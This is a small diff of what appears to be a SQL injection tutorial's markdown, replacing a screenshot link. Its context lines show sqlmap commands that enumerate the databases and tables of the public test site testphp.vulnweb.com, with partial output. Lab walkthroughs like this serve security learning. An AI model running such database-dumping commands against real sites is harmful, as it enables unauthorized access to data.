@@ -80,7 +80,8 @@ sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
 
 
-![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
+![Screenshot_2024-12-11_06_40_06](https://github.com/user-attachments/assets/4d2bd366-341f-4a0a-99eb-7f4ac4f65b91)
+
 Database: acuart
 [8 tables]
 
